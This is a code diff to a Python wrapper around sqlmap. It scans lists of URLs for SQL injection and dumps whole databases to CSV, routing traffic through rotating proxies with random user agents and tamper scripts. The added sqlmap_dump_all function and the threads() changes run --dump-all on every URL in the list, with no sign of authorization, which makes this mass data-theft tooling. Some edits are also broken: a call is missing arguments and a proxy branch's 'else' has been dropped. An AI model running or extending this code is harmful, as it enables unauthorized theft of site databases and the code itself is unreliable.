@@ -35,7 +35,7 @@ except:
 if (wrapper_config.Check_SQLi == True and wrapper_config.DUMP == True):
     print('Check_SQLi or DUMP')
     sys.exit()
-elif (wrapper_config.Check_SQLi == False and wrapper_config == False):
+elif (wrapper_config.Check_SQLi == False and wrapper_config.DUMP == False):
     print('Check_SQLi or DUMP')
     sys.exit()
 
@@ -51,7 +51,7 @@ DUMP_SQLMAP_SAVE = os.path.join(
         os.path.realpath(__file__)), 
         wrapper_config.SQLMAP_DUMPS)
 
-print DUMP_SQLMAP_FOLDER
+print DUMP_SQLMAP_SAVE
 
 DUMP_TXT_FOLDER = os.path.join(
     os.path.dirname(
@@ -254,10 +254,7 @@ def sqlmap_check(url, pos, check_timeout, proxy=None):
                         try:
                             async_tables_pool.apply_async( 
                                     sqlmap_dump(
-                                    url, 
-                                    db, 
-                                    table, 
-                                    [(step - wrapper_config.DUMP_COLUMN_LIMIT + 1), step], 
+                                    url,
                                     56000,
                                     proxy))
                         except:pass
@@ -297,7 +294,7 @@ def sqlmap_check(url, pos, check_timeout, proxy=None):
 
 
 
-def sqlmap_dump(url, db, table, limit, check_timeout, proxy=None):
+def sqlmap_dump(url, check_timeout, proxy=None):
     start_time = datetime.now().time()
     if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
         process = Popen(
@@ -400,6 +397,105 @@ def sqlmap_dump(url, db, table, limit, check_timeout, proxy=None):
         except: pass
         
 
+def sqlmap_dump_all(url, check_timeout, proxy=None):
+    start_time = datetime.now().time()
+    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
+        process = Popen(
+            [
+                'python', 
+                'sqlmap.py',
+                '--url=%s' % url,
+                '--batch',
+                '--time-sec=30',
+                '--level=%s' % wrapper_config.LEVEL,
+                '--risk=%s' % wrapper_config.RISK,
+                '--random-agent',
+                '--threads=3',
+                '--answers=quit=n,crack=n',
+                '--tamper=%s' % wrapper_config.TAMPER,
+                '--dump-all',
+                '--dump-format=CSV',
+                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
+                '--proxy=%s://%s' % (
+                    wrapper_config.PROXY_TYPE, 
+                    proxy),
+                '--proxy-cred=%s:%s' % (
+                    wrapper_config.PROXY_USERNAME, 
+                    wrapper_config.PROXY_PASSWORD),
+                '--exclude-sysdbs',
+                '--timeout=%s' % wrapper_config.TIMEOUT,
+                '--retries=%s' % wrapper_config.RETRIES,
+                '--technique=EUSQ',
+            ])
+        psu_process = Process(process.pid)
+        try:
+            psu_process.wait(check_timeout)
+        except TimeoutExpired: pass
+        try:
+            psu_process.kill()
+        except: pass
+    elif wrapper_config.PROXY:
+        process = Popen(
+            [
+                'python', 
+                'sqlmap.py',
+                '--url=%s' % url,
+                '--batch',
+                '--level=%s' % wrapper_config.LEVEL,
+                '--risk=%s' % wrapper_config.RISK,
+                '--random-agent',
+                '--threads=3',
+                '--answers=quit=n,crack=n',
+                '--tamper=%s' % wrapper_config.TAMPER,
+                '--dump-all',
+                '--dump-format=CSV',
+                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
+                '--proxy=%s://%s' % (
+                    wrapper_config.PROXY_TYPE, 
+                    proxy),
+                '--exclude-sysdbs',
+                '--timeout=%s' % wrapper_config.TIMEOUT,
+                '--retries=%s' % wrapper_config.RETRIES,
+                '--technique=EUSQ',
+            ])
+        psu_process = Process(process.pid)
+        try:
+            psu_process.wait(check_timeout)
+        except TimeoutExpired: pass
+        try:
+            psu_process.kill()
+        except: pass
+    else:
+        process = Popen(
+            [
+                'python', 
+                'sqlmap.py',
+                '--url=%s' % url,
+                '--time-sec=15',
+                '--batch',
+                '--level=%s' % wrapper_config.LEVEL,
+                '--risk=%s' % wrapper_config.RISK,
+                '--random-agent',
+                '--threads=3',
+                '--answers=quit=n,crack=n',
+                '--tamper=%s' % wrapper_config.TAMPER,
+                '--dump-all',
+                '--dump-format=CSV',
+                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
+                #'--proxy=socks5://localhost:9091',
+                '--exclude-sysdbs',
+                '--timeout=%s' % wrapper_config.TIMEOUT,
+                '--retries=%s' % wrapper_config.RETRIES,
+                '--technique=EUSQ',
+            ])
+        psu_process = Process(process.pid)
+        try:
+            psu_process.wait(check_timeout)
+        except TimeoutExpired: pass
+        try:
+            psu_process.kill()
+        except: pass
+        
 
 def sqli_check(url, pos, check_timeout, proxy=None):
     print "Find SQLi"
@@ -784,6 +880,7 @@ def threads():
                 position = len(urls) - urls.index(url)
             except:
                 position = 0
+
             if wrapper_config.Check_SQLi == True:
                 if wrapper_config.PROXY:
                     pool.apply_async(sqli_check, (
@@ -794,15 +891,22 @@ def threads():
                         clean_url(url), 
                         position, 56000, ))
 
-
             if wrapper_config.DUMP == True:
                 if wrapper_config.PROXY:
                     pool.apply_async(sqlmap_check, (
                         clean_url(url), 
                         position, 56000, choice(proxies)))
-                else:
                     pool.apply_async(sqlmap_check, 
                         (clean_url(url), position, 56000))
+
+            if wrapper_config.DUMP_ALL == True:
+                if wrapper_config.PROXY:
+                    pool.apply_async(sqlmap_dump_all, (
+                        clean_url(url), 
+                        position, 56000, choice(proxies)))
+                    pool.apply_async(sqlmap_dump_all, 
+                        (clean_url(url), position, 56000))
+
 
         pool.close()
         pool.join()
